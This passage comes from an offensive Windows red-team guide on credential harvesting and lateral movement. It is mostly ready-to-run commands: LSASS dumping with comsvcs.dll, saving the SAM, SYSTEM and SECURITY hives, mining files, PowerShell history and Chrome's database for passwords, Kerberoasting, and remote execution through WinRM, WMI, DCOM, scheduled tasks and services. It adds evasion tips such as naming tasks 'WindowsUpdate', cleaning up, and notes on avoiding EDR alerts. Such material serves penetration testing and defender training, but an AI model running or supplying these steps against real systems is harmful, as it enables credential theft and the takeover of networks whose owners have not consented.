After you've exfiltrated the dump, clean up:

```powershell
# Delete the dump file
Remove-Item C:\temp\lsass.dmp -Force
```

If you have GUI access to the system (maybe through RDP), there's an even simpler method that users of Windows legitimately use all the time:

1. Open Task Manager (Ctrl+Shift+Esc or run taskmgr.exe)
2. Go to the Details tab
3. Find "Local Security Authority Process" or lsass.exe
4. Right-click and select "Create dump file"
5. Task Manager will create the dump and show you the path

This is completely legitimate system administration behavior. IT support creates process dumps all the time for troubleshooting.

### Registry Credential Extraction

Windows stores local account password hashes in the SAM (Security Account Manager) registry hive. These hashes are encrypted with a key stored in the SYSTEM registry hive. If you can extract both of these hives, you can decrypt the password hashes offline.

Here's how to extract these registry hives using the built-in reg.exe utility:

> **🚨 EDR REALITY CHECK (2025):** Registry hive dumps of SAM/SYSTEM/SECURITY are **well-known attack indicators** with straightforward detection rules in modern EDRs. Most security products flag `reg save` operations on these specific hives. The combination of all three being extracted in succession is especially suspicious. This technique works in lab environments and systems without EDR, but will trigger alerts in monitored environments. Consider alternative approaches like registry parsing in-memory or using Volume Shadow Copy techniques with additional obfuscation.

```powershell
# Save the SAM hive
reg save HKLM\SAM C:\temp\sam.hive

# Save the SYSTEM hive (contains the encryption key)
reg save HKLM\SYSTEM C:\temp\system.hive

# Also save SECURITY for cached domain credentials
reg save HKLM\SECURITY C:\temp\security.hive
```

These commands use the reg.exe utility, which is the standard Windows registry manipulation tool. The 'save' operation creates a backup copy of the specified registry hive. This is a completely legitimate administrative operation - system administrators back up registry hives all the time before making system changes.

However, there's an important requirement: you need administrator privileges to access these registry hives. Windows protects them specifically because they contain sensitive security information.

Once you have these files, exfiltrate them to your attacker machine and parse them:

```bash
# On your attacker machine, use secretsdump from Impacket
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL
```

This will extract local account password hashes from the SAM hive, LSA secrets from the SECURITY hive (which can include service account passwords, auto-logon credentials, and more), and cached domain credentials from SECURITY (these are hashes of domain credentials for users who have logged into this machine).

The cached domain credentials are particularly interesting. Windows caches the last 10 domain logins (by default) so that users can log in even when the domain controller is unavailable. These cached credentials are hashed, but they can be cracked offline if the passwords are weak.

For remote systems where you have administrative access, you can extract registry hives over the network if the RemoteRegistry service is running:

```powershell
# Check if RemoteRegistry service is running on target
Get-Service -Name RemoteRegistry -ComputerName TARGET-PC

# Start it if it's not running
Get-Service -Name RemoteRegistry -ComputerName TARGET-PC | Start-Service

# Connect to remote registry and save hives
reg save \\TARGET-PC\HKLM\SAM C:\temp\remote_sam.hive
reg save \\TARGET-PC\HKLM\SYSTEM C:\temp\remote_system.hive
```

Be aware that starting RemoteRegistry can be logged and might trigger alerts in monitored environments.

### Searching for Credentials in Files

One of the most successful credential harvesting techniques is simply searching for credentials stored in files. You'd be surprised how often administrators, developers, and users store passwords in plaintext files - scripts, configuration files, documentation, notes.

Here's how I systematically search for credentials:

```powershell
# Search for files that might contain passwords
Get-ChildItem C:\ -Recurse -Include *.txt,*.xml,*.ini,*.config,*.ps1,*.bat,*.cmd -ErrorAction SilentlyContinue |
    Select-String -Pattern "password" -CaseSensitive:$false |
    Group-Object Path |
    Select-Object Name
```

This recursively searches the C: drive for text files, XML files, configuration files, and scripts that contain the word "password". The Group-Object Path part prevents duplicate results for files with multiple matches.

Let me be more specific about high-value targets:

```powershell
# Look for unattended installation files (often contain admin credentials)
Get-ChildItem C:\Windows\Panther\ -Recurse -Include unattend.xml,autounattend.xml -ErrorAction SilentlyContinue

# Check for Group Policy Preferences files (can contain passwords)
Get-ChildItem C:\Windows\SYSVOL\ -Recurse -Include Groups.xml,Services.xml,Scheduledtasks.xml,DataSources.xml,Printers.xml,Drives.xml -ErrorAction SilentlyContinue

# Look for VNC server password files
Get-ChildItem C:\ -Recurse -Include ultravnc.ini,vnc.ini -ErrorAction SilentlyContinue

# Search for database connection strings
Get-ChildItem C:\inetpub\ -Recurse -Include web.config -ErrorAction SilentlyContinue |
    Select-String -Pattern "connectionString"

# Look for FileZilla saved credentials
Get-ChildItem C:\Users\*\AppData\Roaming\FileZilla\ -Include sitemanager.xml,recentservers.xml -ErrorAction SilentlyContinue
```

Let me explain why each of these is valuable:

Unattended installation files (unattend.xml) are used for automated Windows deployments. They often contain local administrator passwords in base64-encoded or even cleartext form. If your organization uses automated deployment, there's a good chance these files are still on systems.

Group Policy Preferences (GPP) files used to be a gold mine until Microsoft patched them. Prior to MS14-025, Group Policy could deploy local user accounts with passwords, and these passwords were encrypted with a published AES key. Even though Microsoft patched this, older environments might still have these files lying around with credentials.

VNC configuration files store passwords that are often weakly encrypted or in plaintext.

Web.config files for ASP.NET applications contain database connection strings, which include SQL Server credentials. These are often highly privileged accounts.

FileZilla, a popular FTP client, stores server credentials including passwords in XML files. If someone uses FileZilla to connect to servers, you get their FTP credentials.

### PowerShell History Mining

PowerShell maintains a command history file, and administrators often type credentials directly into PowerShell commands when running scripts or making one-off connections. This history is stored in a plaintext file for each user.

```powershell
# Get the PowerShell history path for current user
$historyPath = (Get-PSReadlineOption).HistorySavePath

# Read the history file
Get-Content $historyPath
```

In my experience, this has been successful more often than you might expect. I've found credentials for service accounts, SQL Server connections, remote systems, and even domain administrator accounts in PowerShell history.

To check all user history files on the system (requires admin):

```powershell
# Search all users' PowerShell history
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue |
    ForEach-Object {
        Write-Output "`n=== History for $($_.FullName) ==="
        Get-Content $_.FullName | Select-String -Pattern "password|credential|username|pwd" -CaseSensitive:$false
    }
```

This searches every user's PowerShell history for lines containing credential-related keywords.

### Browser Credential Extraction

Modern browsers store saved passwords, and while they're encrypted, the encryption keys are available to the user's account. With native tools, you can't easily decrypt browser passwords directly, but you can access the browser's credential storage.

For Chrome, passwords are stored in a SQLite database:

```powershell
# Chrome password database location
$chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Copy the database (can't read it directly as Chrome locks it)
Copy-Item $chromePath C:\temp\ChromePasswords.db
```

You'd then need to exfiltrate this database and decrypt it offline. The decryption requires the user's DPAPI master key, which can be extracted with the LSASS dump we created earlier.

### Cached Domain Credentials

Windows caches domain credentials to allow users to log in when domain controllers are unavailable. These are stored in the SECURITY registry hive and can be extracted:

```powershell
# Extract the SECURITY hive (already covered this)
reg save HKLM\SECURITY C:\temp\security.hive
```

When you parse this with secretsdump or other tools, you'll get the cached credentials. These are salted and hashed, but if the passwords are weak, they can be cracked.

The format is different from NTLM hashes - they're MS Cache v2 hashes. You'd crack them with hashcat using mode 2100:

```bash
hashcat -m 2100 -a 0 hashes.txt wordlist.txt
```

### Credential Manager and DPAPI

Windows Credential Manager stores saved credentials for network shares, RDP connections, and other applications. These credentials are protected by DPAPI (Data Protection API), which encrypts them using keys derived from the user's password.

To view what's in Credential Manager:

```powershell
# List stored credentials
cmdkey /list
```

This shows you what credentials are saved, but not the actual passwords. To extract the passwords, you'd need to decrypt the DPAPI-protected credential files, which requires either the user's password or their DPAPI master key (which you can get from the LSASS dump).

The credential files are stored in:

```powershell
# Credential Manager files location
Get-ChildItem C:\Users\*\AppData\Local\Microsoft\Credentials\ -ErrorAction SilentlyContinue
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Credentials\ -ErrorAction SilentlyContinue
```

### Kerberoasting: Extracting Service Account Credentials

Kerberoasting is one of my favorite credential harvesting techniques because it's completely stealthy and can be done with nothing but native Windows tools. Let me explain what makes this technique so powerful.

In Active Directory environments, services that run under domain accounts (like SQL Server, IIS application pools, or custom services) need a way for clients to authenticate to them. This is handled through Service Principal Names (SPNs). When a user wants to access a service, their computer requests a service ticket (TGS - Ticket Granting Service ticket) from the domain controller. Here's the critical part: that service ticket is encrypted with the password hash of the service account.

What makes this exploitable is that any authenticated domain user can request a service ticket for any service in the domain. Once you have that ticket, you can take it offline and crack it at your leisure. The domain controller doesn't care who requests tickets or why - it's a normal part of Kerberos authentication. And since you're cracking the ticket offline, there's no account lockout risk. You can try billions of passwords without anyone knowing.

Let me walk you through the complete process using only native Windows tools.

First, we already covered finding accounts with SPNs in the enumeration section, but let me show you again with more context:

```powershell
# Find all user accounts with SPNs registered
$searcher = [ADSISearcher]"(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset"))
$results = $searcher.FindAll()

foreach ($result in $results) {
    $username = $result.Properties['samaccountname'][0]
    $spn = $result.Properties['serviceprincipalname'][0]
    $pwdLastSet = [DateTime]::FromFileTime([Int64]$result.Properties['pwdlastset'][0])

    Write-Output "Username: $username"
    Write-Output "SPN: $spn"
    Write-Output "Password Last Set: $pwdLastSet"
    Write-Output "---"
}
```

This query returns all user accounts (not computer accounts) that have SPNs. The pwdlastset field is interesting because accounts with old passwords are more likely to have weak passwords that you can crack.

Now comes the actual Kerberoasting - requesting the service tickets. I'm going to use the built-in .NET Framework classes that are available on every Windows system:

```powershell
# Request TGS tickets for all discovered SPNs
Add-Type -AssemblyName System.IdentityModel

foreach ($result in $results) {
    $spn = $result.Properties['serviceprincipalname'][0]
    $username = $result.Properties['samaccountname'][0]

    try {
        Write-Output "[*] Requesting ticket for $spn ($username)"
        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        Write-Output "[+] Ticket requested successfully"
    }
    catch {
        Write-Output "[-] Failed to request ticket: $($_.Exception.Message)"
    }
}
```

This code loads the System.IdentityModel assembly (built into .NET Framework) and uses the KerberosRequestorSecurityToken class to request service tickets. This is exactly what happens when legitimate applications access Kerberos-authenticated services - we're just doing it manually.

After running this, the tickets are cached in memory. You can verify they're there using the built-in klist command:

```powershell
# List all cached Kerberos tickets
klist
```

You'll see output like:

```
#0>     Client: user @ DOMAIN.LOCAL
        Server: MSSQLSvc/sql01.domain.local:1433 @ DOMAIN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 11/28/2025 10:30:45
        End Time:   11/28/2025 20:30:45
        Renew Time: 12/5/2025 10:30:45
```

The encryption type is important - older accounts might use RC4-HMAC, which is weaker and faster to crack. Modern accounts use AES-256, which is much stronger.

Now we need to extract these tickets so we can crack them offline. This is where it gets a bit tricky with only native tools. The tickets are stored in LSASS memory, and we need to export them in a format that cracking tools understand.

The most straightforward way with native tools is to use Mimikatz's functionality, but since we're trying to stay native, we can export them through the LSASS dump we already created earlier:

```powershell
# If you haven't already dumped LSASS, do it now
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\temp\lsass.dmp full
```

Then on your attacker machine, you can extract the Kerberos tickets from the LSASS dump using pypykatz:

```bash
# On your attacker machine
pypykatz lsa minidump lsass.dmp -k kerberos_tickets
```

This extracts the tickets in a format you can crack with hashcat or John the Ripper.

Alternatively, if you want to export tickets in a more targeted way, you can use PowerShell to access the Windows API directly. Here's a more advanced technique that extracts the ticket in Kirbi format (which can be converted to crackable format):

```powershell
# This requires more complex P/Invoke code, but here's the concept
# Note: This is significantly more complex and typically requires additional tooling
# Most practitioners use the LSASS dump method above

# Export tickets using klist
klist tickets > C:\temp\tickets.txt
```

The `klist` output isn't directly crackable, but it shows you what tickets you have. To actually crack them, you need the raw ticket data from LSASS.

Once you have the tickets extracted on your attacking machine, crack them with hashcat:

```bash
# Crack the extracted tickets
# Mode 13100 for Kerberos 5 TGS-REP (AES256)
# Mode 19700 for Kerberos 5 TGS-REP (AES128)
# Mode 18200 for Kerberos 5 AS-REP etype 23

hashcat -m 13100 -a 0 tickets.txt /path/to/wordlist.txt
```

If you successfully crack the password, you now have valid credentials for that service account. Service accounts often have elevated privileges - SQL Server service accounts frequently have sysadmin rights on the database server, and some service accounts are even members of Domain Admins.

One more advanced technique - if you have GenericWrite, GenericAll, or WriteDacl permissions on a user account, you can set an SPN on that account yourself, then Kerberoast it. This is useful when there aren't many existing SPNs in the environment:

```powershell
# Set an SPN on an account you have write access to
# This requires the ActiveDirectory module or direct LDAP manipulation
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add="HTTP/fake.domain.local"}

# Request ticket for the SPN you just added
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/fake.domain.local"

# After extracting and cracking, clean up
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Remove="HTTP/fake.domain.local"}
```

This technique is called "Targeted Kerberoasting" and is particularly useful when the user you have control over has a weak password but doesn't have an SPN by default.

## Lateral Movement Techniques

Once you have credentials - whether from LSASS dumps, registry extraction, or file searches - it's time to move laterally through the network. Lateral movement is how you go from that initial foothold on one workstation to controlling multiple systems and ultimately reaching your objectives.

The key to successful lateral movement is blending in with normal network traffic. Administrators move between systems all the time using legitimate tools and protocols. If you use those same tools and protocols, your activity looks like normal IT operations.

### PowerShell Remoting: The Modern Way

> **🚨 EDR REALITY CHECK (2025):** WMI remote execution and Invoke-Command are increasingly monitored in restricted corporate environments with mature security programs. While these techniques are legitimate admin tools (which is why they're not universally blocked), behavioral analytics now flag unusual patterns: connections from non-admin accounts, connections outside business hours, rapid sequential connections to multiple hosts, or connections from unexpected source systems. These are still more stealthy than PsExec or other third-party tools, but they're not invisible. Advanced monitoring solutions log WinRM activity and PowerShell Remoting sessions for forensic analysis.

PowerShell Remoting is the modern standard for Windows system administration. It replaced older tools like PsExec and telnet for remote management. In any well-managed Windows environment, PowerShell Remoting is enabled on servers and increasingly on workstations.

PowerShell Remoting uses WinRM (Windows Remote Management) protocol, which runs over HTTP/HTTPS on ports 5985/5986. The traffic is encrypted, and from a network monitoring perspective, it looks like legitimate remote administration.

Let me show you how I use PowerShell Remoting for lateral movement:

First, check if a target system has PowerShell Remoting enabled:

```powershell
# Test if WinRM is accessible on the target
Test-WSMan -ComputerName TARGET-PC
```

If this returns system information, PowerShell Remoting is available. If it fails, the system either doesn't have WinRM enabled, it's blocked by a firewall, or you don't have permission to connect.

For an interactive session on the remote system:

```powershell
# Start an interactive PowerShell session on remote system
Enter-PSSession -ComputerName TARGET-PC -Credential (Get-Credential)
```

This prompts you for credentials and then drops you into a PowerShell session on the remote system. Anything you type is executed on the target. Your prompt changes to indicate you're in a remote session:

```
[TARGET-PC]: PS C:\Users\admin\Documents>
```

This is useful for interactive exploration, but in a real engagement, interactive sessions create longer-lived connections that are more likely to be noticed. I prefer one-off command execution:

```powershell
# Execute a single command remotely
Invoke-Command -ComputerName TARGET-PC -ScriptBlock { whoami }
```

The ScriptBlock contains the PowerShell code you want to execute. This could be a single command like `whoami` or a complex script. The command executes, returns the output, and closes the connection immediately.

For better OPSEC, you want to avoid entering credentials interactively because it might trigger logging or prompts. If you have credentials (maybe from a previous compromise), create a credential object:

```powershell
# Create a credential object
$password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\username", $password)

# Use the credential object
Invoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock {
    # Your code here
    Get-Process
}
```

One of the most powerful aspects of PowerShell Remoting is that you can target multiple systems simultaneously:

```powershell
# Execute command on multiple systems
$targets = @("TARGET-PC1", "TARGET-PC2", "TARGET-PC3")
Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {
    Get-LocalGroupMember -Group "Administrators"
}
```

This runs the command on all three systems in parallel and returns the results. The output includes a PSComputerName property so you know which system each result came from.

You can also run local scripts on remote systems:

```powershell
# Execute a local script file on remote systems
Invoke-Command -ComputerName TARGET-PC -FilePath C:\scripts\enumeration.ps1
```

This reads the local script file, sends it to the remote system, and executes it there. The script never touches disk on the remote system - it executes entirely in memory.

A few important considerations about PowerShell Remoting:

First, it requires the target system to have WinRM enabled and configured. On servers (Windows Server 2012 and later), it's enabled by default. On workstations, it usually needs to be manually enabled or enabled via Group Policy.

Second, it creates Windows Event Log entries on both the source and target systems. Event ID 4624 (successful logon) with logon type 3 (network) and Event ID 4648 (explicit credential use) are created. On the target, WinRM logs (Microsoft-Windows-WinRM/Operational) record the connection.

Third, there's the "double-hop" problem. When you connect to System A using credentials, and then try to access System B from System A, it fails because your credentials aren't passed along. This is by design for security, but it complicates lateral movement chains. The solution is CredSSP, but enabling it can be complex and requires configuration changes.

### Using Harvested Credentials: Pass-the-Hash and Beyond

Now that we've harvested credentials through various methods, let's talk about how to actually use them for lateral movement. This is where many people get confused because there are several different techniques depending on what kind of credentials you've obtained.

Let me clarify something important: true "pass-the-hash" (using only an NTLM hash without knowing the cleartext password) is actually very difficult with only native Windows tools. The Windows authentication architecture doesn't natively support authenticating with just a hash - it expects either cleartext passwords or Kerberos tickets. Tools like Mimikatz and Impacket work around this by injecting the hash into LSASS or by implementing the NTLM authentication protocol themselves.

However, we can accomplish similar results using native Windows tools through several techniques. Let me walk you through the options based on what credentials you've obtained.

#### Option 1: Using Cleartext Passwords

If you've successfully cracked hashes or found cleartext passwords (in files, PowerShell history, etc.), using them is straightforward. You create a PSCredential object and use it with PowerShell Remoting or WMI:

```powershell
# Create a credential object with cleartext password
$password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\username", $password)

# Use it for PowerShell Remoting
Invoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock {
    whoami
    hostname
}

# Or with WMI
$options = New-Object System.Management.ConnectionOptions
$options.Username = "DOMAIN\username"
$options.Password = "P@ssw0rd123"
$scope = New-Object System.Management.ManagementScope("\\TARGET-PC\root\cimv2", $options)
$scope.Connect()

# Now you can query WMI or execute commands
```

This is completely native and works reliably. The downside is you need the cleartext password.

#### Option 2: Pass-the-Ticket (Using Kerberos Tickets)

This is a native technique that works without any additional tools. If you've extracted Kerberos tickets from LSASS (either TGTs or service tickets), you can import them into your current session and use them for authentication.

The challenge is that with only native tools, importing tickets is difficult. The tickets are stored in LSASS, and there's no native Windows command to import a ticket file. However, if you've extracted a ticket from one user session, you can use it in another session on the same machine:

```powershell
# List current tickets
klist

# Purge current tickets (optional - be careful with this)
klist purge

# Unfortunately, there's no native "klist import" command
# Tickets can be imported programmatically using Windows APIs, but this requires
# P/Invoke code or additional tools like Rubeus
```

The reality is that true pass-the-ticket with only native tools is limited. You can work with tickets that are already in memory, but importing external tickets requires Windows API calls that aren't exposed through PowerShell cmdlets.

#### Option 3: Overpass-the-Hash (Pass-the-Key)

Here's a more practical native technique. If you have an NTLM hash, you can use it to request a Kerberos TGT (Ticket Granting Ticket), then use that TGT for authentication. This is called "overpass-the-hash" or "pass-the-key."

The tricky part is that requesting a TGT with just a hash requires direct manipulation of Windows authentication APIs. With only native PowerShell, this is very difficult. However, I can show you the concept:

```powershell
# This is the theory - actual implementation requires complex P/Invoke code
# The steps would be:
# 1. Use the NTLM hash to compute a Kerberos key
# 2. Use that key to request a TGT from the domain controller
# 3. Import the TGT into the current session
# 4. Use the TGT for authentication

# In practice, this is what Rubeus does with the "asktgt" command
# Native implementation would require:
# - P/Invoke calls to LsaLogonUser or similar APIs
# - Manual Kerberos AS-REQ construction
# - Crypto operations to compute the Kerberos key from NTLM hash

# This is beyond what's practical with "native tools only"
```

The honest truth is that true pass-the-hash and overpass-the-hash are difficult without tools like Mimikatz or Rubeus. These tools exist specifically because Windows doesn't natively expose these capabilities.

#### Option 4: The Practical Native Approach

Here's what I actually do in engagements when restricted to native tools. After dumping LSASS and extracting credentials, I:

1. **Crack the NTLM hashes offline** (using hashcat) to get cleartext passwords
2. **Use the cleartext passwords** with PSCredential objects
3. **Leverage existing Kerberos tickets** on compromised systems without exporting them

Let me show you the third option in detail, because it's very powerful and completely native:

```powershell
# Scenario: You've compromised a system where a domain admin is logged in
# Their Kerberos tickets are already in memory

# Check what tickets are available
klist

# If you see a TGT for a privileged account, you can use it without doing anything!
# The ticket is already active in the session

# Now, from this same session, use PowerShell Remoting to a target
Enter-PSSession -ComputerName DC01

# You're now authenticated as the domain admin whose TGT is in memory
# This works because the system automatically uses available Kerberos tickets
```

This is incredibly powerful. If you've compromised a system where privileged users are logged in (or have recently logged in and their tickets haven't expired), you can piggyback on their existing Kerberos authentication without needing to export, import, or manipulate tickets at all.

Another practical approach is using `runas` with the `/netonly` flag:

```powershell
# This doesn't truly pass-the-hash, but it lets you create a process with alternate network credentials
# The credentials must be valid (you can't use just a hash here)
runas /netonly /user:DOMAIN\admin "powershell.exe"

# This spawns a new PowerShell process
# Any network authentication from this process will use the specified credentials
# But the local process runs under your current user context
```

When you run commands in this new PowerShell window, network operations (like accessing file shares, WMI, PowerShell Remoting) will use the credentials you specified.

#### Option 5: Using NTLM Hashes with WMI (Workaround)

Here's a creative workaround. While you can't directly use NTLM hashes with native PowerShell, you can use the fact that some Windows APIs accept NTLM authentication directly. However, this still ultimately requires the cleartext password for the API call:

```powershell
# This still needs cleartext, but shows how authentication works
$username = "DOMAIN\user"
$password = "P@ssw0rd123"

# Create WMI connection with explicit credentials
$options = New-Object System.Management.ConnectionOptions
$options.Username = $username
$options.Password = $password
$options.Impersonation = [System.Management.ImpersonationLevel]::Impersonate
$options.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy

$scope = New-Object System.Management.ManagementScope("\\TARGET-PC\root\cimv2", $options)
$scope.Connect()

# Execute WMI query
$query = New-Object System.Management.ObjectQuery("SELECT * FROM Win32_Process")
$searcher = New-Object System.Management.ManagementObjectSearcher($scope, $query)
$processes = $searcher.Get()
```

The reality is that with native tools only, your best approach for lateral movement is:
1. Extract credentials (LSASS dumps, registry, files)
2. Crack NTLM hashes offline to get cleartext passwords (or use Kerberos tickets you've extracted)
3. Use cleartext passwords with PSCredential objects for PowerShell Remoting and WMI
4. Leverage existing Kerberos tickets on compromised systems without exporting them

This is why tools like Mimikatz and Rubeus exist - they fill the gaps that native Windows tools don't cover for offensive operations. But with creativity and patience, you can accomplish most lateral movement goals with native tools by focusing on credential extraction and cracking rather than trying to use hashes directly.

### WMI: The Old Reliable

WMI (Windows Management Instrumentation) has been around since Windows NT, and it's still incredibly useful for lateral movement. Every Windows system has WMI, it's enabled by default, and it's a completely legitimate management protocol.

The key advantage of WMI over PowerShell Remoting is that it works on older systems and doesn't require any special configuration. If you have admin credentials for a system, you can use WMI to interact with it.

Here's how to execute commands remotely using WMI:

```powershell
# Execute a command on a remote system using WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName TARGET-PC
```

Let me break down what's happening here. We're calling the Create method of the Win32_Process WMI class, which creates a new process. The ArgumentList is the command we want to run. This executes on the remote system as SYSTEM or as the user account that WMI is running under.

The challenge with WMI is that you don't get output directly - the command executes, but you can't see what it returned. That's why in the example above, I redirected output to a file. To get that output, I need to read the file:

```powershell
# Read the output file
$output = Get-Content \\TARGET-PC\C$\temp\output.txt

# Display the output
$output

# Clean up the file
Remove-Item \\TARGET-PC\C$\temp\output.txt
```

The `\\TARGET-PC\C$` notation accesses the administrative share on the remote system, which is available if you have admin credentials.

For a more elegant approach, you can use WMI to execute PowerShell, which can then return output directly:

```powershell
# Execute PowerShell command via WMI
$command = "Get-Process | ConvertTo-Json"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -EncodedCommand $encodedCommand -NoProfile" -ComputerName TARGET-PC
```

WMI can also be used to query remote systems for information without executing commands:

```powershell
# Get OS information from remote system
Get-WmiObject -Class Win32_OperatingSystem -ComputerName TARGET-PC

# Get running processes
Get-WmiObject -Class Win32_Process -ComputerName TARGET-PC

# Get installed hotfixes
Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName TARGET-PC
```

These queries are completely passive from the remote system's perspective - you're just reading information, not executing anything.

One more powerful WMI technique is using wmic.exe, the command-line interface to WMI:

```batch
wmic /node:TARGET-PC process call create "cmd.exe /c whoami"
```

This does the same thing as Invoke-WmiMethod but from cmd.exe instead of PowerShell. Sometimes this is useful if you're working from a basic shell without PowerShell access.

Important note about WMI: It uses DCOM (Distributed COM) for communication, which means it uses dynamic RPC ports (typically in the range 49152-65535). Firewalls might block these ports between network segments. It also creates event log entries - Event ID 4624 with logon type 3 for the network authentication.

### DCOM: The Stealthy Alternative

DCOM (Distributed Component Object Model) is less commonly used than WMI or PowerShell Remoting, which actually makes it more interesting for red teaming. Security tools are less likely to specifically monitor for DCOM abuse, and it's not typically discussed in defensive training.

DCOM allows you to instantiate COM objects on remote systems and call their methods. Certain COM objects can be abused to execute commands remotely. Let me show you the most reliable techniques:

```powershell
# Method 1: MMC20.Application
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET-PC"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

This uses the MMC20.Application COM object, which is the Microsoft Management Console's automation interface. The ExecuteShellCommand method does exactly what it sounds like - executes a shell command with the command "cmd.exe", directory set to $null (using the default), parameters "/c calc.exe", and window state "7" (hidden window).

```powershell
# Method 2: ShellWindows
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET-PC"))
$item = $dcom.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

ShellWindows represents Windows Explorer windows. Each Explorer window has a Document.Application object that exposes a ShellExecute method with the file "cmd.exe", arguments "/c calc.exe", directory "C:\Windows\System32", operation set to $null (default, which means "open"), and show value 0 (hidden).

```powershell
# Method 3: ShellBrowserWindow
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET-PC"))
$item = $dcom.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

ShellBrowserWindow is similar to ShellWindows and uses the same ShellExecute method.

The advantages of DCOM are that it's less commonly monitored than WMI or PowerShell Remoting, it uses standard RPC/DCOM ports (135 plus dynamic ports), it doesn't require WinRM to be enabled, and it works on older Windows systems that might not have PowerShell Remoting configured.

The disadvantages are that you don't get command output (similar to WMI), it requires admin credentials, the COM objects might not be available on all systems, and some EDR solutions now monitor DCOM abuse after it became publicly known in the security community.

### Scheduled Tasks for Remote Execution

Creating scheduled tasks on remote systems is a completely legitimate administrative action that's perfect for lateral movement:

```batch
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c whoami > C:\temp\output.txt" /sc once /st 00:00 /S TARGET-PC /U DOMAIN\username /P password
```

Let me break down this command. The `/create` flag creates a new task, while `/tn "WindowsUpdate"` sets the task name disguised as a legitimate update task. The `/tr "cmd.exe /c..."` parameter specifies the command to run. We use `/sc once` to set it as a one-time task with `/st 00:00` as the start time (midnight, though we'll run it immediately). The `/S TARGET-PC` targets the remote system, and `/U DOMAIN\username` and `/P password` provide the credentials for authentication.

After creating the task, run it immediately:

```batch
schtasks /run /tn "WindowsUpdate" /S TARGET-PC /U DOMAIN\username /P password
```

Then clean up:

```batch
schtasks /delete /tn "WindowsUpdate" /S TARGET-PC /U DOMAIN\username /P password /F
```

The `/F` flag forces deletion without confirmation.

For better OPSEC, you can configure the task to run as SYSTEM:

```batch
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c your_command" /sc once /st 00:00 /ru SYSTEM /S TARGET-PC /U DOMAIN\username /P password
```

The `/ru SYSTEM` flag makes the task run as SYSTEM, giving you the highest privileges on the target system.

You can also create more sophisticated tasks using PowerShell:

```powershell
# Create a scheduled task using PowerShell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -Command Get-Process"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "SystemMaintenance" -Action $action -Trigger $trigger -Principal $principal -CimSession TARGET-PC
```

This creates a task that will run one minute from now as SYSTEM. The `-CimSession` parameter allows you to target a remote system.

Scheduled tasks are logged in the Task Scheduler event logs (Event ID 106 for task registered, 200 for task executed), but they're so common in enterprise environments that they rarely trigger alerts unless the task name or command is obviously suspicious.

### Service-Based Lateral Movement

Windows services are another legitimate mechanism for executing code that can be abused for lateral movement:

```batch
# Create a service on the remote system
sc.exe \\TARGET-PC create UpdateService binPath= "cmd.exe /c whoami > C:\temp\output.txt" start= demand
```

Note the spaces after `binPath=` and `start=` - they're required for sc.exe to parse the command correctly.

Start the service:

```batch
sc.exe \\TARGET-PC start UpdateService
```

When the service starts, it executes the command specified in binPath. Services run as SYSTEM by default unless you specify otherwise.

Clean up:

```batch
sc.exe \\TARGET-PC delete UpdateService
```

The limitation of this technique is that the command needs to behave like a service - it needs to respond to service control messages. A simple command like `cmd.exe /c whoami` won't work properly as a service because it doesn't implement the Service Control Manager interface. The command will execute, but you'll get an error that the service didn't start properly.

To work around this, you can use a service-friendly executable or wrap your command:

```batch
sc.exe \\TARGET-PC create UpdateService binPath= "C:\Windows\System32\cmd.exe /c start /b powershell.exe -Command \"Get-Process | Out-File C:\temp\processes.txt\"" start= demand
```

Or better yet, point the service at a legitimate Windows binary that can act as a service:

```batch
# Create service pointing to a payload you've copied to the target
sc.exe \\TARGET-PC create UpdateService binPath= "C:\Windows\Temp\payload.exe" start= demand
```

Service creation and modification are logged (Event ID 7045 for new services), and security-conscious organizations often monitor for suspicious service creation. Use service names that blend in with legitimate Windows services.

### Network Pivoting with netsh

